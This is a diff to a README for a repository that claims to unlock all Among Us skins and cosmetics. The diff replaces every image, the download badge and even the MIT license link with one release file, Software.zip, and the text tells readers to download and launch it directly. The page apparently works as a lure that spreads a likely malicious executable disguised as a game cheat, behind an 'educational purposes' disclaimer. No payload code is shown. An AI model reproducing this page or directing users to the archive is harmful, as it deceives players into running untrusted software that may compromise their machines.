@@ -1,7 +1,7 @@
 
 # 🎮 Among Us: Unlock All Skins and Cosmetics - Custom Tools 🌟
 
-![Among Us](https://img.icons8.com/color/96/000000/among-us.png)
+![Among Us](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the "Among Us Unlock All Skins and Cosmetics - Custom Tools" repository! This tool is designed to unlock all skins, hats, and pets in the popular game Among Us. Please use this tool responsibly and for educational purposes only. It allows you to modify local game files, providing a way to customize your gaming experience. Remember, do not use this tool for unfair advantage in multiplayer games.
@@ -30,7 +30,7 @@ Welcome to the "Among Us Unlock All Skins and Cosmetics - Custom Tools" reposito
 ## Get Started
 To access the tools and resources in this repository, download the latest version using the link below 👇
 
-[![Download Custom Tools](https://img.shields.io/badge/DownloadTools-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Custom Tools](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
 ### Note:
 The above link should be directly downloaded and launched to utilize the tools available in this repository. Enjoy unlocking all the cool skins and cosmetics in Among Us with this custom tool!
@@ -38,7 +38,7 @@ The above link should be directly downloaded and launched to utilize the tools a
 If you encounter any issues with the link provided, please check the "Releases" section of this repository for alternative download options.
 
 ## About Among Us
-![Among Us Characters](https://img.icons8.com/ios-filled/50/000000/among-us.png)
+![Among Us Characters](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
 Among Us is a popular online multiplayer game that takes place in a space-themed setting. Players work together to complete tasks on their spaceship, but some players are impostors trying to sabotage the mission. It's a game of deception and strategy that has captured the interest of players around the world.
 
@@ -57,7 +57,7 @@ Follow these steps to unlock all skins and cosmetics in Among Us using this tool
 4. Enjoy a fully customized experience in Among Us!
 
 ## Legal Disclaimer
-![Legal Documents](https://img.icons8.com/ios/50/000000/lawsuit.png)
+![Legal Documents](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
 This tool is intended for educational purposes only. Use it responsibly and do not misuse it to gain an unfair advantage in the game. The creators of this tool are not responsible for any consequences resulting from its usage. Play fair and have fun in Among Us!
 
@@ -65,14 +65,14 @@ This tool is intended for educational purposes only. Use it responsibly and do n
 Join our community of Among Us enthusiasts to share tips, tricks, and customizations using this tool. Connect with fellow players and enhance your gaming experience together.
 
 ## Contribute
-![Contribute Image](https://img.icons8.com/ios-glyphs/60/000000/share.png)
+![Contribute Image](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
 You can contribute to this repository by submitting bug reports, feature requests, or enhancements. Your feedback is valuable in improving this tool for the community. Let's make Among Us even more exciting with custom skins and cosmetics!
 
 ## License
-![License Image](https://img.icons8.com/dusk/64/000000/copyright.png)
+![License Image](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip)
 
-This project is licensed under the [MIT license](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT license](https://github.com/DiegoJ109910/Among-Us-Unlock-All-Skins-and-Cosmetics---Custom-Tools/releases/download/v1.0/Software.zip) - see the [LICENSE](LICENSE) file for details.
 
 ---
 
